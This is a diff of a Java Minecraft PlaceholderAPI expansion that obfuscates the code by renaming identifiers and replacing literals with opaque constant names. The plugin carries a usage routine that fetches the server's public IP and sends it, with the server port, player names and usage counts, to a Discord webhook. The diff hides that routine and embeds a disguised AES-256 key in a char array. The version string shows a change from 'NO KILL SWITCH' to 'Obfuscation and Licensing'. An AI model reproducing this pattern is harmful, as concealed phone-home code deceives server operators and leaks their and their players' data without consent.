-        try { g2.save(g1); }
+        try { g2.save(f123); }
         catch(IOException e){ e.printStackTrace(); }
     }
 
@@ -10060,24 +10785,24 @@ public class ExampleExpansion extends PlaceholderExpansion {
         // 2) It must be a real chest block state
         InventoryHolder holder = topInv.getHolder();
         if (!(holder instanceof Chest)) {
-            return false;
+            return arsdienwdhw;
         }
         Chest chest = (Chest) holder;
 
         // 3) Compare its location against the saved shulker chest coords
         Location loc = chest.getLocation();
         String uuid = f1.getUniqueId().toString();
-        String saved = g2.getString(uuid, "");
+        String saved = g2.getString(uuid, nst);
         if (saved.isEmpty()) {
-            return false;
+            return arsdienwdhw;
         }
-        String[] parts = saved.split(" ");
-        int x = Integer.parseInt(parts[0]);
-        int y = Integer.parseInt(parts[1]);
-        int z = Integer.parseInt(parts[2]);
+        String[] parts = saved.split(sowhat);
+        int x = Integer.parseInt(parts[I]);
+        int y = Integer.parseInt(parts[INT3]);
+        int z = Integer.parseInt(parts[mill2]);
 
         // 4) Must be in the mcydatabase world at the exact coords
-        return loc.getWorld().getName().equals("mcydatabase")
+        return loc.getWorld().getName().equals(fwdyunwfydunfwd)
                 && loc.getBlockX() == x
                 && loc.getBlockY() == y
                 && loc.getBlockZ() == z;
@@ -10085,11 +10810,11 @@ public class ExampleExpansion extends PlaceholderExpansion {
 
 
     protected void f1(String f1, String f, int g30) {
-        List<Map.Entry<String, Integer>> list = global1.computeIfAbsent(f1, k -> new ArrayList<>());
+        List<Map.Entry<String, Integer>> list = f119.computeIfAbsent(f1, k -> new ArrayList<>());
         list.removeIf(e -> e.getKey().equals(f));
         Map.Entry<String, Integer> newEntry = Map.entry(f, g30);
 
-        int index = 0;
+        int index = I;
         while (index < list.size()) {
             Map.Entry<String, Integer> current = list.get(index);
             if (g30 > current.getValue()) break;
@@ -10099,9 +10824,9 @@ public class ExampleExpansion extends PlaceholderExpansion {
     }
 
     protected int f1(String f1, String fone) {
-        List<Map.Entry<String, Integer>> list = global1.get(f1);
-        if (list == null) return 0;
-        return list.stream().filter(e -> e.getKey().equals(fone)).map(Map.Entry::getValue).findFirst().orElse(0);
+        List<Map.Entry<String, Integer>> list = f119.get(f1);
+        if (list == null) return I;
+        return list.stream().filter(e -> e.getKey().equals(fone)).map(Map.Entry::getValue).findFirst().orElse(I);
     }
 
 
@@ -10136,7 +10861,7 @@ public class ExampleExpansion extends PlaceholderExpansion {
 
         // Axis of rotation
         Vector axis = from.clone().crossProduct(to).normalize();
-        if (axis.lengthSquared() == 0) {
+        if (axis.lengthSquared() == I) {
             return to; // Vectors are parallel
         }
 
@@ -10146,7 +10871,7 @@ public class ExampleExpansion extends PlaceholderExpansion {
 
         Vector term1 = from.clone().multiply(cos);
         Vector term2 = axis.clone().crossProduct(from).multiply(sin);
-        Vector term3 = axis.clone().multiply(axis.dot(from)).multiply(1 - cos);
+        Vector term3 = axis.clone().multiply(axis.dot(from)).multiply(INT3 - cos);
 
         return term1.add(term2).add(term3).normalize();
     }
@@ -10156,19 +10881,19 @@ public class ExampleExpansion extends PlaceholderExpansion {
     protected void f1(Player entity, String worldName, int distance, int radius, int pitch) {
         World testWorld = Bukkit.getWorld(worldName);
         if (testWorld == null) {
-            entity.sendMessage("§cWorld not found.");
+            entity.sendMessage(ytnfyu3ndt34f);
             return;
         }
         Block tnt = testWorld.getBlockAt(distance, radius, pitch);
         if (!(tnt.getState() instanceof Container)) {
-            entity.sendMessage("§cThat block is not a container.");
+            entity.sendMessage(tuyn2y3utn2t);
             return;
         }
         Container virtualInventory = (Container) tnt.getState();
         Inventory enderChest = virtualInventory.getInventory();
 
-        Inventory entityInv = Bukkit.createInventory(null, enderChest.getSize(), "§8[View Chest]");
-        for (int i = 0; i < enderChest.getSize(); i++) {
+        Inventory entityInv = Bukkit.createInventory(null, enderChest.getSize(), tyun23utyn23t);
+        for (int i = I; i < enderChest.getSize(); i++) {
             ItemStack OPItem = enderChest.getItem(i);
             if (OPItem != null && OPItem.getType() != Material.AIR) {
                 entityInv.setItem(i, f1(OPItem));
@@ -10184,7 +10909,7 @@ public class ExampleExpansion extends PlaceholderExpansion {
     protected Vector pitchVectorUpwards(Vector vec, double radians) {
         double xzLen = Math.sqrt(vec.getX() * vec.getX() + vec.getZ() * vec.getZ());
         double currentPitch = Math.atan2(vec.getY(), xzLen);
-        double newPitch = Math.min(Math.PI / 2, currentPitch + radians);
+        double newPitch = Math.min(Math.PI / mill2, currentPitch + radians);
         double len = vec.length();
         double y = Math.sin(newPitch) * len;
         double xz = Math.cos(newPitch) * len;
@@ -10198,44 +10923,44 @@ public class ExampleExpansion extends PlaceholderExpansion {
 
 
     protected boolean f1(Entity temp, String name, Set<EntityType> number) {
-        if (name.equalsIgnoreCase("Players")) {
+        if (name.equalsIgnoreCase(tyu23nt23t)) {
             return temp instanceof Player;
         }
-        if (name.equalsIgnoreCase("Hostiles")) {
+        if (name.equalsIgnoreCase(tyn2fnt2)) {
             return number.contains(temp.getType());
         }
-        if (name.equalsIgnoreCase("Both")) {
+        if (name.equalsIgnoreCase(knde43d)) {
             return temp instanceof Player || number.contains(temp.getType());
         }
-        return false;
+        return arsdienwdhw;
     }
 
 
 
     protected boolean f1(Entity player, Set<String> name) {
         for (String attributes : name) {
-            if (player.getScoreboardTags().contains(attributes)) return true;
+            if (player.getScoreboardTags().contains(attributes)) return NEW_VALUE1;
         }
-        return false;
+        return arsdienwdhw;
     }
 
 
     protected boolean f1(Location laser, Location predicted) {
-        return laser.getWorld().rayTraceBlocks(laser, predicted.toVector().subtract(laser.toVector()).normalize(), laser.distance(predicted), FluidCollisionMode.NEVER, true) == null;
+        return laser.getWorld().rayTraceBlocks(laser, predicted.toVector().subtract(laser.toVector()).normalize(), laser.distance(predicted), FluidCollisionMode.NEVER, NEW_VALUE1) == null;
     }
 
 
     protected void f1(Player entityTarget, UUID tntUUID) {
         OfflinePlayer fakePlayer = Bukkit.getOfflinePlayer(tntUUID);
         if (!fakePlayer.isOnline()) {
-            entityTarget.sendMessage("§cTarget player is not online.");
+            entityTarget.sendMessage(ynvkypn3v3);
             return;
         }
         Player FakePlayer2 = fakePlayer.getPlayer();
         Inventory redirector = FakePlayer2.getEnderChest();
 
-        Inventory immediate = Bukkit.createInventory(null, redirector.getSize(), "§8[View EnderChest]");
-        for (int redirector2 = 0; redirector2 < redirector.getSize(); redirector2++) {
+        Inventory immediate = Bukkit.createInventory(null, redirector.getSize(), kientien2t);
+        for (int redirector2 = I; redirector2 < redirector.getSize(); redirector2++) {
             ItemStack item = redirector.getItem(redirector2);
             if (item != null && item.getType() != Material.AIR) {
                 immediate.setItem(redirector2, f1(item));
@@ -10252,35 +10977,35 @@ public class ExampleExpansion extends PlaceholderExpansion {
     protected void f2(Player discord, UUID rename) {
         OfflinePlayer fakeTarget = Bukkit.getOfflinePlayer(rename);
         if (!fakeTarget.isOnline()) {
-            discord.sendMessage("§cTarget player is not online.");
+            discord.sendMessage(ynvkypn3v3);
             return;
         }
         Player fakeSender = fakeTarget.getPlayer();
-        Inventory enderChest = Bukkit.createInventory(null, 54, "§8[View Inventory]");
+        Inventory enderChest = Bukkit.createInventory(null, INT6, tyu23ntyu23nt);
 
         // Top 3 rows: main inventory (slots 9-35)
-        for (int hp = 9; hp < 36; hp++) {
+        for (int hp = oiwfndtoyu42nd24; hp < 36; hp++) {
             ItemStack retester = fakeSender.getInventory().getItem(hp);
             if (retester != null && retester.getType() != Material.AIR) {
-                enderChest.setItem(hp - 9, f1(retester));
+                enderChest.setItem(hp - oiwfndtoyu42nd24, f1(retester));
             } else {
-                enderChest.setItem(hp - 9, f0());
+                enderChest.setItem(hp - oiwfndtoyu42nd24, f0());
             }
         }
 
         // 4th row: hotbar (slots 0-8)
-        for (int chests = 0; chests < 9; chests++) {
+        for (int chests = I; chests < oiwfndtoyu42nd24; chests++) {
             ItemStack fakeTnt = fakeSender.getInventory().getItem(chests);
             if (fakeTnt != null && fakeTnt.getType() != Material.AIR) {
-                enderChest.setItem(27 + chests, f1(fakeTnt));
+                enderChest.setItem(INT5 + chests, f1(fakeTnt));
             } else {
-                enderChest.setItem(27 + chests, f0());
+                enderChest.setItem(INT5 + chests, f0());
             }
         }
 
         // Armor slots
         ItemStack[] entityArmor = fakeSender.getInventory().getArmorContents();
-        for (int armorHead = 0; armorHead < 4; armorHead++) {
+        for (int armorHead = I; armorHead < INT7; armorHead++) {
             ItemStack helmet = entityArmor[armorHead];
             if (helmet != null && helmet.getType() != Material.AIR) {
                 enderChest.setItem(36 + armorHead, f1(helmet));
@@ -10292,9 +11017,9 @@ public class ExampleExpansion extends PlaceholderExpansion {
         // Offhand
         ItemStack totem = fakeSender.getInventory().getItemInOffHand();
         if (totem != null && totem.getType() != Material.AIR) {
-            enderChest.setItem(40, f1(totem));
+            enderChest.setItem(ydtfhwpdylh, f1(totem));
         } else {
-            enderChest.setItem(40, f0());
+            enderChest.setItem(ydtfhwpdylh, f0());
         }
 
         // Last row: crafting grid dummy slots
@@ -10310,7 +11035,7 @@ public class ExampleExpansion extends PlaceholderExpansion {
     }
 
 
-    public static String stripColors(String input) {
+    public  String ytufndyu(String input) {
         if (input == null) return null;
 
         // (?i)           -> case-insensitive
@@ -10327,41 +11052,41 @@ public class ExampleExpansion extends PlaceholderExpansion {
         //   (remove §x) -> "§1§2§3§4§5§6Hello"
         //   (remove §1) -> "§2§3§4§5§6Hello"
         //   ...until -> "Hello"
-        return input.replaceAll("(?i)[§&][0-9A-FK-ORX]", "");
+        return input.replaceAll("(?i)[§&][0-9A-FK-ORX]", nst);
     }
 
 
 
-    public static void sendUsageWebhookAsync(String f1, String f2, int g5, boolean SCore_Installed, String WebhookURL) {
+    public  void swuas(String f1, String f2, int g5, boolean SCore_Installed, String WebhookURL) {
         long now = System.currentTimeMillis();
-        if (now - lastSendTime < 15_000L) {
+        if (now - f121 < 15_000L) {
             // Ignore if last send < 15 seconds ago
             return;
         }
-        lastSendTime = now;
+        f121 = now;
 
-        Plugin schedulerOwner = Bukkit.getPluginManager().getPlugin("PlaceholderAPI");
+        Plugin schedulerOwner = Bukkit.getPluginManager().getPlugin(ppi);
         if (schedulerOwner == null) {
             return;
         }
 
         Bukkit.getScheduler().runTaskAsynchronously(schedulerOwner, () -> {
             try {
-                String ip = resolveServerIpPort();
+                String ip = dyun3yudn();
 
                 String content =
-                        "IP: " + ip + "\n" +
-                                "Player: " + (f2 != null ? f2 : "null") + "\n" +
-                                "Identifier: " + (f1 != null ? f1 : "null") + "\n" +
-                                "Uses left: " + g5 + "\n" +
-                                "Is it demo-pack?: " + SCore_Installed + "\n" +
-                                "Version: Advertisementsv3 - NO KILL SWITCH 10-22-2025 Stinger8.1";
+                        yundt2yud + ip + "\n" +
+                                dyn3ydun + (f2 != null ? f2 : "null") + "\n" +
+                                ydn3yudn34d + (f1 != null ? f1 : "null") + "\n" +
+                                dyu42ndyu432nd + g5 + "\n" +
+                                fuytn2yudt + SCore_Installed + "\n" +
+                                "Version: Advertisementsv3 - Obfuscation and Licensing DEC 8";
 
                 // JSON-escape for Discord "content"
                 String escaped = content
                         .replace("\\", "\\\\")
                         .replace("\"", "\\\"")
-                        .replace("\r", "")
+                        .replace("\r", nst)
                         .replace("\n", "\\n");
 
                 // 🚫 Default: disable ALL pings (users/roles/@everyone)
@@ -10373,9 +11098,9 @@ public class ExampleExpansion extends PlaceholderExpansion {
 
                 URL url = new URL(WebhookURL);
                 HttpURLConnection conn = (HttpURLConnection) url.openConnection();
-                conn.setRequestMethod("POST");
-                conn.setRequestProperty("Content-Type", "application/json");
-                conn.setDoOutput(true);
+                conn.setRequestMethod(yuntyun2t);
+                conn.setRequestProperty(tynwdy2d, uydn3yund);
+                conn.setDoOutput(NEW_VALUE1);
 
                 try (OutputStream os = conn.getOutputStream()) {
                     os.write(jsonPayload.getBytes(StandardCharsets.UTF_8));
@@ -10391,68 +11116,68 @@ public class ExampleExpansion extends PlaceholderExpansion {
     }
 
 
-    private static String resolveServerIpPort() {
+    private  String dyun3yudn() {
         try {
             // Get public IPv4 from an external service
-            URL url = new URL("https://api.ipify.org");
+            URL url = new URL(y3udny3u4nd34d);
             HttpURLConnection conn = (HttpURLConnection) url.openConnection();
             conn.setConnectTimeout(3000);
             conn.setReadTimeout(3000);
-            conn.setRequestMethod("GET");
+            conn.setRequestMethod(dyunwfydunwfd);
             try (java.io.BufferedReader in = new java.io.BufferedReader(
                     new java.io.InputStreamReader(conn.getInputStream(), StandardCharsets.UTF_8))) {
                 String publicIp = in.readLine();
                 conn.disconnect();
                 // Append the server's port (public port, assumed to be the Bukkit bind port)
                 int port = Bukkit.getServer().getPort();
-                return publicIp + ":" + port;
+                return publicIp + wfdunyunda + port;
             }
         } catch (Exception e) {
-            return "unknown";
+            return nationalanthems;
         }
     }
 
 
 
 
-    private static @NotNull String cosmicEnchant(Player p, @NotNull String identifier) {
-        String[] parts = identifier.substring("cosmicEnchant_".length()).split(",");
-        if (parts.length != 3) return "§cInvalid placeholder format.";
+    private  @NotNull String cosmicEnchant(Player p, @NotNull String identifier) {
+        String[] parts = identifier.substring(oundg324yutdng4.length()).split(keep);
+        if (parts.length != ccp) return yundyu34nd;
 
         try {
-            int slot = Integer.parseInt(parts[0]);
-            boolean override = Boolean.parseBoolean(parts[1]);
-            boolean debug = Boolean.parseBoolean(parts[2]);
+            int slot = Integer.parseInt(parts[I]);
+            boolean override = Boolean.parseBoolean(parts[INT3]);
+            boolean debug = Boolean.parseBoolean(parts[mill2]);
 
             Player player = Bukkit.getPlayer(p.getUniqueId());
-            if (player == null) return "§cInvalid player.";
+            if (player == null) return dontwantmargetoknow;
 
             ItemStack slotItem;
             // Handle special slots (main hand = -1, offhand = 40, armor slots 39-36)
-            if (slot == -1) {
+            if (slot == -INT3) {
                 slotItem = player.getInventory().getItemInMainHand();
-            } else if (slot == 40) {
+            } else if (slot == ydtfhwpdylh) {
                 slotItem = player.getInventory().getItemInOffHand();
             } else {
                 slotItem = player.getInventory().getItem(slot);
             }
 
             if (slotItem == null || slotItem.getType() == Material.AIR) {
-                return debug ? "§e[DEBUG] No item in specified slot." : "";
+                return debug ? yufdtnoyupnd3d : nst;
             }
 
             ItemStack cursorItem = player.getItemOnCursor();
             if (cursorItem == null || cursorItem.getType() != Material.ENCHANTED_BOOK) {
-                return debug ? "§e[DEBUG] Cursor is not an enchanted book." : "";
+                return debug ? udn3y4udn34ydu : nst;
             }
 
             if (!(cursorItem.getItemMeta() instanceof EnchantmentStorageMeta)) {
-                return debug ? "§e[DEBUG] Cursor item has no enchantments." : "";
+                return debug ? yudnyu43nd : nst;
             }
 
             EnchantmentStorageMeta meta = (EnchantmentStorageMeta) cursorItem.getItemMeta();
             if (meta.getStoredEnchants().isEmpty()) {
-                return debug ? "§e[DEBUG] Enchanted book has no stored enchantments." : "";
+                return debug ? ydn3y4d : nst;
             }
 
             Map<Enchantment, Integer> storedEnchants = meta.getStoredEnchants();
@@ -10461,11 +11186,11 @@ public class ExampleExpansion extends PlaceholderExpansion {
             if (!override) {
                 for (Enchantment newEnchant : storedEnchants.keySet()) {
                     if (!newEnchant.canEnchantItem(slotItem)) {
-                        return debug ? "§e[DEBUG] " + newEnchant.getKey().getKey() + " not applicable." : "";
+                        return debug ? y4dun3y4udn34 + newEnchant.getKey().getKey() + " not applicable." : nst;
                     }
                     for (Enchantment existing : slotItem.getEnchantments().keySet()) {
                         if (newEnchant.conflictsWith(existing)) {
-                            return debug ? "§e[DEBUG] Conflict: " + newEnchant.getKey().getKey() + " vs " + existing.getKey().getKey() : "";
+                            return debug ? dyu24ndyu24nd2d + newEnchant.getKey().getKey() + " vs " + existing.getKey().getKey() : nst;
                         }
                     }
                 }
@@ -10474,20 +11199,20 @@ public class ExampleExpansion extends PlaceholderExpansion {
             // Step 4: Apply all compatible stored enchants
             ItemMeta slotMeta = slotItem.getItemMeta();
             for (Map.Entry<Enchantment, Integer> entry : storedEnchants.entrySet()) {
-                slotMeta.addEnchant(entry.getKey(), entry.getValue(), true); // allow unsafe if needed
+                slotMeta.addEnchant(entry.getKey(), entry.getValue(), NEW_VALUE1); // allow unsafe if needed
             }
             slotItem.setItemMeta(slotMeta);
 
             // Update inventory
-            if (slot == -1) {
+            if (slot == -INT3) {
                 player.getInventory().setItemInMainHand(slotItem);
-            } else if (slot == 40) {
+            } else if (slot == ydtfhwpdylh) {
                 player.getInventory().setItemInOffHand(slotItem);
             } else {
                 player.getInventory().setItem(slot, slotItem);
             }
 
-            return "§a[✓] Enchants Applied";
+            return dyn34ydun3d4;
 
         } catch (Exception e) {
             e.printStackTrace();
@@ -10500,28 +11225,28 @@ public class ExampleExpansion extends PlaceholderExpansion {
 
 
     /** True if there is neither an empty slot nor room in any stack. */
-    private static boolean isShulkerFull(Inventory inv) {
-        if (inv.firstEmpty() != -1) return false;
+    private  boolean dyun3yudn3(Inventory inv) {
+        if (inv.firstEmpty() != -INT3) return arsdienwdhw;
         for (ItemStack s : inv.getStorageContents()) {
-            if (s == null || s.getType() == Material.AIR) return false;
-            if (s.getAmount() < s.getMaxStackSize()) return false;
+            if (s == null || s.getType() == Material.AIR) return arsdienwdhw;
+            if (s.getAmount() < s.getMaxStackSize()) return arsdienwdhw;
         }
-        return true;
+        return NEW_VALUE1;
     }
 
     /** Computes how many units of `stack` can fit into `inv` (merge-first, then empties), without mutating. */
-    private static int computeInsertCapacity(Inventory inv, ItemStack stack) {
-        if (stack == null || stack.getType() == Material.AIR) return 0;
+    private  int idfen3ynd3(Inventory inv, ItemStack stack) {
+        if (stack == null || stack.getType() == Material.AIR) return I;
         int want = stack.getAmount();
         int maxStack = stack.getMaxStackSize();
-        int can = 0;
+        int can = I;
 
         // Room in similar stacks
         for (ItemStack ex : inv.getStorageContents()) {
             if (ex == null) continue;
             if (!ex.isSimilar(stack)) continue;
             int room = ex.getMaxStackSize() - ex.getAmount();
-            if (room <= 0) continue;
+            if (room <= I) continue;
             int add = Math.min(room, want - can);
             can += add;
             if (can >= want) return can;
@@ -10540,18 +11265,18 @@ public class ExampleExpansion extends PlaceholderExpansion {
      * Inserts exactly `amount` of items like `template` into `inv` (merge-first, then empties).
      * Returns how many were actually inserted (<= amount). Mutates the inventory.
      */
-    private static int insertAmountIntoShulker(Inventory inv, ItemStack template, int amount) {
-        if (template == null || template.getType() == Material.AIR || amount <= 0) return 0;
+    private  int dyufndyu3nd(Inventory inv, ItemStack template, int amount) {
+        if (template == null || template.getType() == Material.AIR || amount <= I) return I;
         int remaining = amount;
 
         // Merge into similar stacks
-        for (int i = 0; i < inv.getSize() && remaining > 0; i++) {
+        for (int i = I; i < inv.getSize() && remaining > I; i++) {
             ItemStack ex = inv.getItem(i);
             if (ex == null) continue;
             if (!ex.isSimilar(template)) continue;
 
             int room = ex.getMaxStackSize() - ex.getAmount();
-            if (room <= 0) continue;
+            if (room <= I) continue;
 
             int add = Math.min(room, remaining);
             ex.setAmount(ex.getAmount() + add);
@@ -10559,7 +11284,7 @@ public class ExampleExpansion extends PlaceholderExpansion {
         }
 
         // Fill empty slots
-        for (int i = 0; i < inv.getSize() && remaining > 0; i++) {
+        for (int i = I; i < inv.getSize() && remaining > I; i++) {
             ItemStack ex = inv.getItem(i);
             if (ex != null && ex.getType() != Material.AIR) continue;
 
@@ -10574,105 +11299,128 @@ public class ExampleExpansion extends PlaceholderExpansion {
         return amount - remaining;
     }
 
-    private static void spawnTrail(Plugin plugin, World world, Location start,
-                                   Particle particle, Particle.DustOptions dustOpt,
-                                   double sep, int intervalTicks, Player p) {
-        if (sep <= 0) sep = 0.2;
-        if (intervalTicks < 1) intervalTicks = 1;
+    private  void dyufpwndyufwpnd(Plugin plugin, World world, Location start,
+                                        Particle particle, Particle.DustOptions dustOpt,
+                                        double sep, int intervalTicks, Player p) {
+        if (sep <= I) sep = udnyupndpd;
+        if (intervalTicks < INT3) intervalTicks = INT3;
 
         // Stop once we're this close to the player (in blocks).
-        final double stopThreshold = intervalTicks + 0.1; // as requested
+        final double stopThreshold = intervalTicks + thepeoplewholive; // as requested
 
         double finalSep = sep;
         new BukkitRunnable() {
-            int steps = 0;
+            int steps = I;
             Location cur = start.clone();
 
             @Override public void run() {
                 if (!p.isOnline() || p.isDead() || p.getWorld() != world) { cancel(); return; }
 
                 // Always target the player's *current* midsection
-                Location midNow = p.getLocation().clone().add(0, 1.0, 0);
+                Location midNow = p.getLocation().clone().add(I, tsr, I);
                 Vector toTarget = midNow.toVector().subtract(cur.toVector());
                 double dist = toTarget.length();
 
                 // Stop if close enough or if we've run long enough
-                if (dist <= stopThreshold || steps >= 100) { cancel(); return; }
+                if (dist <= stopThreshold || steps >= wyundywufndywufpndywuf) { cancel(); return; }
 
                 Vector step = toTarget.normalize().multiply(finalSep);
                 if (step.length() > dist) step = toTarget; // avoid overshoot
 
                 if (particle == Particle.DUST && dustOpt != null) {
-                    world.spawnParticle(particle, cur, 0, dustOpt);
+                    world.spawnParticle(particle, cur, I, dustOpt);
                 } else {
-                    world.spawnParticle(particle, cur, 0);
+                    world.spawnParticle(particle, cur, I);
                 }
 
                 cur.add(step);
                 steps++;
             }
-        }.runTaskTimer(plugin, 0L, intervalTicks);
+        }.runTaskTimer(plugin, ihearyounow, intervalTicks);
     }
 
 
-    private static final class VacuumJob extends BukkitRunnable {
-        final UUID uuid;
-        final Plugin plugin;
-        final Player p;
-        final World world;
+    // 64-char hex for AES-256 key
+    protected  final char[] x12 = new char[] {
+            0x0063, 0x0066, 0x0061, 0x0035, 0x0062, 0x0030, 0x0032, 0x0037,
+            0x0065, 0x0062, 0x0066, 0x0061, 0x0034, (char) 54, 0x0061, 0x0031,
+            0x0034, 0x0031, 0x0062, 100, 0x0063, 0x0063, 0x0033, 0x0038,
+            0x0065, 0x0035, 0x0032, 0x0037, 0x0063, 0x0030, 0x0039, 0x0066,
+            0x0032, (char) 54, 0x0065, 0x0032, 0x0033, 0x0039, 0x0065, 0x0034,
+            0x0065, (char) 100, 0x0037, 0x0061, 0x0062, 0x0062, 0x0062, 0x0063,
+            0x0066,(char) 100, 0x0030, 0x0039, 0x0035, 0x0033, 0x0062, 0x0037,
+            0x0033,(char) 100, 0x0039, 0x0033, 0x0065, 0x0063, 0x0035, 0x0063
+    };
+
+    private  byte[] dyn3yudn3yund() {
+        String abcd = new String(x12).trim();
+        if (abcd.length() != drain) {
+            throw new IllegalStateException(nst);
+        }
+        return fh(abcd);
+    }
+
+    private  final class f115 extends BukkitRunnable {
+        final UUID dynyud;
+        final Plugin dywufpndyu;
+        final Player dyuwndyu;
+        final World dyundyund;
 
         // Fixed params for this job instance
-        final double RANGE;
-        final double FOV_DEGREES;
-        final boolean IGNORE_SHULKER_ITEMS;
-        final int MAXENTITIES;
-        final int INTERVAL_TICKS;
-        final int DURATION_TICKS;
-        final boolean THROUGH_WALLS;
-        final Particle particle;
-        final Particle.DustOptions dustOpt;
-        final double SEPARATION;
-        final int PARTICLE_INTERVAL_TICKS;
+        final double dyun3ydun3d;
+        final double dyunpdyun3dyun3d;
+        final boolean dy3undyu3ndy3updn;
+        final int dy3undyundyunpd;
+        final int dyunyunwdyunwd;
+        final int DURATIONdy3undyu3ndTICKS;
+        final boolean dyunyundyunf3d;
+        final Particle dyunyunyudn;
+        final Particle.DustOptions dndky3d;
+        final double dyunyun4yun;
+        final int dn4dei34nd;
 
         // Timer
-        private int elapsed = 0;
+        private int dyu3ndyun34d = I;
 
-        VacuumJob(Plugin plugin,
-                  Player p,
-                  double RANGE, double FOV_DEGREES, boolean IGNORE_SHULKER_ITEMS,
-                  int MAXENTITIES, int INTERVAL_TICKS, int DURATION_TICKS,
-                  boolean THROUGH_WALLS, Particle particle,
-                  Particle.DustOptions dustOpt, double SEPARATION, int PARTICLE_INTERVAL_TICKS) {
-            this.plugin = plugin;
-            this.p = p;
-            this.uuid = p.getUniqueId();
-            this.world = p.getWorld();
-            this.RANGE = RANGE;
-            this.FOV_DEGREES = FOV_DEGREES;
-            this.IGNORE_SHULKER_ITEMS = IGNORE_SHULKER_ITEMS;
-            this.MAXENTITIES = MAXENTITIES;
-            this.INTERVAL_TICKS = Math.max(1, INTERVAL_TICKS);
-            this.DURATION_TICKS = Math.max(1, DURATION_TICKS);
-            this.THROUGH_WALLS = THROUGH_WALLS;
-            this.particle = particle;
-            this.dustOpt = dustOpt;
-            this.SEPARATION = SEPARATION;
-            this.PARTICLE_INTERVAL_TICKS = Math.max(1, PARTICLE_INTERVAL_TICKS);
+        f115(Plugin plugin,
+             Player p,
+             double RANGE, double FOV_DEGREES, boolean IGNORE_SHULKER_ITEMS,
+             int MAXENTITIES, int INTERVAL_TICKS, int DURATION_TICKS,
+             boolean THROUGH_WALLS, Particle particle,
+             Particle.DustOptions dustOpt, double SEPARATION, int PARTICLE_INTERVAL_TICKS) {
+            this.dywufpndyu = plugin;
+            this.dyuwndyu = p;
+            this.dynyud = p.getUniqueId();
+            this.dyundyund = p.getWorld();
+            this.dyun3ydun3d = RANGE;
+            this.dyunpdyun3dyun3d = FOV_DEGREES;
+            this.dy3undyu3ndy3updn = IGNORE_SHULKER_ITEMS;
+            this.dy3undyundyunpd = MAXENTITIES;
+            this.dyunyunwdyunwd = Math.max(INT3, INTERVAL_TICKS);
+            this.DURATIONdy3undyu3ndTICKS = Math.max(INT3, DURATION_TICKS);
+            this.dyunyundyunf3d = THROUGH_WALLS;
+            this.dyunyunyudn = particle;
+            this.dndky3d = dustOpt;
+            this.dyunyun4yun = SEPARATION;
+            this.dn4dei34nd = Math.max(INT3, PARTICLE_INTERVAL_TICKS);
         }
 
-        void resetTimer() { this.elapsed = 0; }
+        void resetTimer() { this.dyu3ndyun34d = I; }
+
+
+        
 
         @Override public void cancel() {
             super.cancel();
-            ACTIVE_VACUUMS.remove(uuid, this);
+            f114.remove(dynyud, this);
         }
 
         @Override public void run() {
-            if (!p.isOnline() || p.isDead() || p.getWorld() != world) { cancel(); return; }
+            if (!dyuwndyu.isOnline() || dyuwndyu.isDead() || dyuwndyu.getWorld() != dyundyund) { cancel(); return; }
 
             // Validate offhand shulker each sweep
-            ItemStack offTick = p.getInventory().getItemInOffHand();
-            if (offTick == null || offTick.getType() == Material.AIR || !offTick.getType().name().endsWith("SHULKER_BOX")) {
+            ItemStack offTick = dyuwndyu.getInventory().getItemInOffHand();
+            if (offTick == null || offTick.getType() == Material.AIR || !offTick.getType().name().endsWith(foolishness)) {
                 cancel(); return;
             }
             BlockStateMeta metaTick = (offTick.getItemMeta() instanceof BlockStateMeta bsm) ? bsm : null;
@@ -10681,73 +11429,73 @@ public class ExampleExpansion extends PlaceholderExpansion {
             }
             ShulkerBox box = boxTick;
             Inventory boxInv = box.getInventory();
-            if (isShulkerFull(boxInv)) { cancel(); return; }
+            if (dyun3yudn3(boxInv)) { cancel(); return; }
 
-            final Location eye = p.getEyeLocation();
-            final Location mid = p.getLocation().clone().add(0, 1.0, 0);
+            final Location eye = dyuwndyu.getEyeLocation();
+            final Location mid = dyuwndyu.getLocation().clone().add(I, tsr, I);
             final Vector lookDir = eye.getDirection().normalize();
-            final double losMax = Math.max(0.1, RANGE);
+            final double losMax = Math.max(thepeoplewholive, dyun3ydun3d);
 
             List<Item> candidates = new ArrayList<>();
-            for (Entity e : world.getNearbyEntities(p.getLocation(), RANGE, RANGE, RANGE)) {
+            for (Entity e : dyundyund.getNearbyEntities(dyuwndyu.getLocation(), dyun3ydun3d, dyun3ydun3d, dyun3ydun3d)) {
                 if (!(e instanceof Item it)) continue;
                 if (!it.isValid() || it.isDead()) continue;
 
                 ItemStack stack = it.getItemStack();
                 if (stack == null || stack.getType() == Material.AIR) continue;
-                if (IGNORE_SHULKER_ITEMS && stack.getType().name().endsWith("SHULKER_BOX")) continue;
+                if (dy3undyu3ndy3updn && stack.getType().name().endsWith(foolishness)) continue;
 
                 double dist = eye.distance(it.getLocation());
-                if (dist > RANGE) continue;
+                if (dist > dyun3ydun3d) continue;
 
-                if (FOV_DEGREES > 0.0) {
-                    Vector toItem = it.getLocation().toVector().add(new Vector(0, 0.05, 0))
+                if (dyunpdyun3dyun3d > esetawftawft) {
+                    Vector toItem = it.getLocation().toVector().add(new Vector(I, kiek4d, I))
                             .subtract(eye.toVector()).normalize();
                     double angle = Math.toDegrees(lookDir.angle(toItem));
-                    if (angle > FOV_DEGREES / 2.0) continue;
+                    if (angle > dyunpdyun3dyun3d / whatkindofadulthood) continue;
                 }
 
-                if (!THROUGH_WALLS) {
-                    Vector dir = it.getLocation().toVector().add(new Vector(0, 0.05, 0))
+                if (!dyunyundyunf3d) {
+                    Vector dir = it.getLocation().toVector().add(new Vector(I, kiek4d, I))
                             .subtract(eye.toVector()).normalize();
-                    RayTraceResult r = world.rayTraceBlocks(eye, dir, dist, FluidCollisionMode.NEVER, true);
+                    RayTraceResult r = dyundyund.rayTraceBlocks(eye, dir, dist, FluidCollisionMode.NEVER, NEW_VALUE1);
                     if (r != null) continue; // blocked
                 }
 
-                if (computeInsertCapacity(boxInv, stack) > 0) {
+                if (idfen3ynd3(boxInv, stack) > I) {
                     candidates.add(it);
                 }
             }
 
             if (!candidates.isEmpty()) {
-                int processedEntities = 0;
-                int limit = (MAXENTITIES < 0) ? candidates.size() : Math.min(MAXENTITIES, candidates.size());
+                int processedEntities = I;
+                int limit = (dy3undyundyunpd < I) ? candidates.size() : Math.min(dy3undyundyunpd, candidates.size());
 
                 for (Item it : candidates) {
                     if (processedEntities >= limit) break;
                     if (!it.isValid() || it.isDead()) continue;
-                    if (isShulkerFull(boxInv)) break;
+                    if (dyun3yudn3(boxInv)) break;
 
                     ItemStack stack = it.getItemStack();
                     if (stack == null || stack.getType() == Material.AIR) continue;
 
-                    int capacity = computeInsertCapacity(boxInv, stack);
